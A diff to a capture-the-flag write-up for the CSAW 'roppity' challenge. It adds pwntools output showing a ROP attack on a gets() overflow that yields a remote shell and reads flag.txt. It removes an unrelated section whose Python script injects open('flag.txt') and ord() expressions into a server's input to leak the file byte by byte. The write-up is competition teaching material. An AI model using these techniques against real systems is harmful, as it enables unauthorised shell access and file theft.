@@ -55,7 +55,7 @@ libc-2.27.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynam
 ```
 
 # Solution
-## Code Analysis:
+## The Program:
 By running the provided binary we see it prints `"Hello"`, takes an input, then exits. Ghidra's pseudocode shows that the program uses `puts()` for output and `gets()` to take input.
 
 ## Vulnerabilities:
@@ -65,7 +65,7 @@ Never use gets().  Because it is impossible to tell without knowing the data in 
 ```
 This vulnerability allows an attacker to overwrite values on the stack, most notably the calling function's return address, to redirect the flow of execution.
 
-## Getting our hands dirty:
+## The Exploit:
 In theory, we can overwrite the return address with a call to the `system()` function in libc to get a shell. We can use python to give the program a really long input to check that we can overwrite the return pointer:
 ```
 python3 -c 'print("A"*200)' | ./rop
@@ -196,130 +196,28 @@ io.sendline(pl2)
 # change to interactive mode to use the shell
 io.interactive()
 ```
-
-Our goal is to read the flag written in the flag.txt file stored on the server BUT we have to keep in mind that both vulnerable inputs are casted as int, so in order not to make the program crash we can only pass in methods that return an integer.
-So how can we get the flag if we can only work with integers?
-The answer: by reading the decimal value of each character that composes the flag!
-
-In order to make that happen, we first need to know the flag length.
-To do that we connect to the server and pass in the following piece of code as the first input: 
-
-`len(open('flag.txt', 'r').readline().split()[0])`
-
-What it does is simply 
-* opening the flag.txt file in reading mode
-* reading its content
-* splitting the content into a list
-* selecting the first element of the list (the flag)
-* returning its length
-
-For the second input we pass 0 as we don’t want to mess up the length value,
-and for the third one we can pass either ‘+’ or ‘-’
-
-At this point the script will compute `FLAG_LENGTH ± 0`, printing out the actual flag length.
-
-Now we are finally ready to read the flag!
-We reconnect to the server and repeat the same procedure with a slightly different line of code:
-
-`ord(open('flag.txt', 'r').readline()[n])`
-
-It does pretty much the same thing as the one above, with the difference that this time we don’t need to get the whole string, so there’s no need to `strip()` it, and instead of calling `len()` we call `ord()` which returns the decimal value of the character at position n.
-
-We still pass 0 and either `‘+’` or `’-’` to the next two inputs and we would get the decimal value of the Nth character of the flag.
-
-All we have to do now is repeat this procedure for every character of the string.
-It would take quite a lot of time to do that by hand, so i decided to automatize it with this simple script.
-
-``` python
-#!/usr/bin/python2
- 
-import socket
- 
-#Custom method to easily send the payload over the socket
-def send(sock, payload):
-    sent = False
- 
-    #Waiting for the first input request
-    while not sent:
-        data = sock.recv(1024)
-        if "First" in data:
-            #Sending the payload to the server
-            sock.send(payload)
-            sent = True
- 
-    sent = False
- 
-    #Waiting for the second input request
-    while not sent:
-        data = sock.recv(1024)
-        if "Second" in data:
-            #Sending 0 as second input
-            sock.send("0\n")
-            sent = True
- 
-    sent = False
- 
-    #Waiting for the third input request
-    while not sent:
-        data = sock.recv(1024)
-        if "Operation" in data:
-            #sending '+' as third input
-            sock.send("+\n")
-            sent = True
- 
-    #Waiting for the result to be calculated
-    while "Sorry" not in data:
-        data = s.recv(1024)
- 
-    #returning the result of the calculation
-    return int(data[-4:-1])
- 
-if __name__ == "__main__":
- 
-    HOST = "misc.hsctf.com"
-    PORT = 7001
- 
-    flag = ""
-    FLAG_LEN = 0
-    new_char = 0
- 
-    #Enstablishing connection with the server
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("misc.hsctf.com", 7001))
- 
-    #Finding the flag length so we can later initialize a loop
-    #to get each flag characters
-    if FLAG_LEN == 0:
-        print("[*] Getting flag length...")
- 
-        #Sending the first code to get the flag length
-        FLAG_LEN = send(s, "len(open('flag.txt', 'r').readline().split()[0])\n")
-        print("[*] Got length: {}".format(FLAG_LEN))
- 
-        #Closing the server socket
-        s.close()
- 
-    #Looping through each flag char
-    for i in range(0, FLAG_LEN):
- 
-        #Enstablishing conneciton with the server
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("misc.hsctf.com", 7001))
- 
-        #Sending the second code the get the ASCII value of the char at i position
-        new_char = chr(send(s, "ord(open('flag.txt', 'r').readline()[{}])\n".format(i)))
-        print("[*] Got char: {}".format(new_char))
- 
-        #Appending char to flag's string
-        flag += new_char
- 
-        #Closing the server socket
-        s.close()
- 
-    print(flag)
+We run it and...
 ```
-
-Once we run it, we wait a few seconds and we would get the flag:
-`flag{please_use_python3}`
-
-(It's fun since I wrote the script using python2 lmao)
+[*] '/ctfs/csaw20/roppity/rop'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/ctfs/csaw20/roppity/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to pwn.chal.csaw.io on port 5016: Done
+[*] Switching to interactive mode
+$ ls
+flag.txt
+rop
+```
+We have a shell! Lets read that `flag.txt` file:
+```
+$ cat ./flag.txt
+flag{r0p_4ft3r_r0p_4ft3R_r0p}
+```
